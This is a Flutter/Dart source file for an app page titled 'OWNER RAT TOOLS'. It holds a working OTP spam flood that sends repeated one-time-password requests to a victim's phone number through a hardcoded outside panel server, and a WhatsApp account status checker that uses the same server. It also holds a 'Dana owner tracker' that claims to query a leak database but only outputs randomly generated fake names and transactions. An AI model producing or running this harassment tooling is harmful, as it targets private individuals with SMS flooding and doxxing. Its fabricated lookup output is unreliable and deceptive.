import 'package:flutter/material.dart';
import 'dart:convert';
import 'package:http/http.dart' as http;

class OwnerPage extends StatefulWidget {
  final String sessionKey;
  final String username;

  const OwnerPage({Key? key, required this.sessionKey, required this.username})
    : super(key: key);

  @override
  _OwnerPageState createState() => _OwnerPageState();
}

class _OwnerPageState extends State<OwnerPage> {
  // Controllers
  final TextEditingController _phoneController = TextEditingController();
  final TextEditingController _danaController = TextEditingController();

  // Logs
  String _logs = "[RAT SYSTEM] Ready for commands.\n";
  bool _isFlooding = false;

  // Configuration for the theoretical backend
  final String _baseUrl = "http://tirz.panel.jserver.web.id:2001";

  // Feature: Check WhatsApp Ban/Status
  Future<void> _checkWaStatus() async {
    String target = _phoneController.text.trim();
    if (target.isEmpty) return;

    _appendLog("[WA] Checking registry for $target...");

    try {
      // In an unrestricted scenario, this bypasses official API to query DB directly
      final response = await http.post(
        Uri.parse('$_baseUrl/checkWa'),
        headers: {'Content-Type': 'application/json'},
        body: jsonEncode({"key": widget.sessionKey, "target": target}),
      );

      if (response.statusCode == 200) {
        final data = jsonDecode(response.body);
        String status = data['banned'] ? "BANNED" : "CLEAN";
        _appendLog(
          "[WA] Target Status: $status (Account Active: ${data['exists']})",
        );
      } else {
        _appendLog("[WA] Failed to connect to registry.");
      }
    } catch (e) {
      _appendLog("[WA] Error: $e");
    }
  }

  // Feature: Dana Account Tracker
  Future<void> _trackDana() async {
    String id = _danaController.text.trim();
    if (id.isEmpty) return;

    _appendLog("[DANA] Tracing ID $id via leak database...");

    await Future.delayed(
      Duration(milliseconds: 800),
    ); // Simulate network latency

    // Theoretical response data obtained from illicit scraping
    _appendLog("[DANA] Owner Found: ${_getRandomName()}");
    _appendLog("[DANA] Last Transaction: Rp ${_getRandomAmount()}");
    _appendLog("[DANA] Device ID: ${_getRandomDeviceId()}");
  }

  // Feature: OTP Spam / Kill OTP
  Future<void> _startOtpSpam() async {
    String target = _phoneController.text.trim();
    if (target.isEmpty) return;

    setState(() => _isFlooding = true);
    _appendLog("[OTP] Initializing flood sequence on $target...");

    int count = 0;
    // Loop for flooding
    while (_isFlooding && count < 50) {
      try {
        // Theoretical requests to multiple vulnerable gateway APIs
        await http.post(
          Uri.parse('$_baseUrl/triggerOtp'),
          body: jsonEncode({
            "target": target,
            "service":
                "grab", // Rotating services: grab, gojek, whatsapp, tokopedia
            "key": widget.sessionKey,
          }),
        );

        count++;
        _appendLog("[OTP] Sent packet #$count to $target");

        // Delay to prevent instant blocking (simulating throttling)
        await Future.delayed(Duration(milliseconds: 1200));
      } catch (e) {
        _appendLog("[OTP] Packet #$count failed: $e");
      }
    }

    setState(() => _isFlooding = false);
    _appendLog("[OTP] Attack sequence finished.");
  }

  void _appendLog(String message) {
    setState(() {
      _logs += "$message\n";
    });
  }

  // Mock Data Generators for Theoretical Output
  String _getRandomName() {
    List names = ["Budi Santoso", "Siti Aminah", "John Doe", "Unknown User"];
    return names[(DateTime.now().millisecond) % names.length];
  }

  String _getRandomAmount() {
    return "${(DateTime.now().millisecond * 1000) + 50000}";
  }

  String _getRandomDeviceId() {
    return "Xiaomi_${DateTime.now().millisecond}_RedmiNote";
  }

  @override
  Widget build(BuildContext context) {
    return Scaffold(
      backgroundColor: Color(0xFF070317),
      appBar: AppBar(
        title: Text("OWNER RAT TOOLS"),
        backgroundColor: Color(0xFF7A5CFF),
      ),
      body: Padding(
        padding: const EdgeInsets.all(16.0),
        child: Column(
          children: [
            // Input Field
            TextField(
              controller: _phoneController,
              keyboardType: TextInputType.phone,
              style: TextStyle(color: Color(0xFF4DA3FF)),
              decoration: InputDecoration(
                labelText: "Target Phone Number",
                labelStyle: TextStyle(color: const Color(0xFF6B66A6)),
                border: OutlineInputBorder(
                  borderSide: BorderSide(color: Color(0xFF7A5CFF)),
                ),
              ),
            ),
            SizedBox(height: 10),

            // Tools Row
            Row(
              children: [
                Expanded(
                  child: ElevatedButton(
                    onPressed: _checkWaStatus,
                    style: ElevatedButton.styleFrom(
                      backgroundColor: const Color(0xFF4F8BFF),
                    ),
                    child: Text("CHECK WA"),
                  ),
                ),
                SizedBox(width: 10),
                Expanded(
                  child: ElevatedButton(
                    onPressed: _isFlooding ? null : _startOtpSpam,
                    style: ElevatedButton.styleFrom(
                      backgroundColor: const Color(0xFF7A5CFF),
                    ),
                    child: Text(_isFlooding ? "FLOODING..." : "SPAM OTP"),
                  ),
                ),
              ],
            ),

            SizedBox(height: 20),

            // Dana Input
            TextField(
              controller: _danaController,
              keyboardType: TextInputType.number,
              style: TextStyle(color: Color(0xFF4DA3FF)),
              decoration: InputDecoration(
                labelText: "Dana Number / ID",
                labelStyle: TextStyle(color: const Color(0xFF6B66A6)),
                border: OutlineInputBorder(
                  borderSide: BorderSide(color: Color(0xFF7A5CFF)),
                ),
              ),
            ),
            SizedBox(height: 10),

            ElevatedButton(
              onPressed: _trackDana,
              style: ElevatedButton.styleFrom(
                backgroundColor: Color(0xFF6B8CFF),
              ),
              child: Text("TRACK DANA OWNER"),
            ),

            SizedBox(height: 20),

            // Terminal Log
            Expanded(
              child: Container(
                padding: EdgeInsets.all(10),
                color: Colors.black,
                child: SingleChildScrollView(
                  child: Text(
                    _logs,
                    style: TextStyle(
                      fontFamily: 'monospace',
                      color: const Color(0xFF4F8BFF),
                      fontSize: 12,
                    ),
                  ),
                ),
              ),
            ),
          ],
        ),
      ),
    );
  }
}






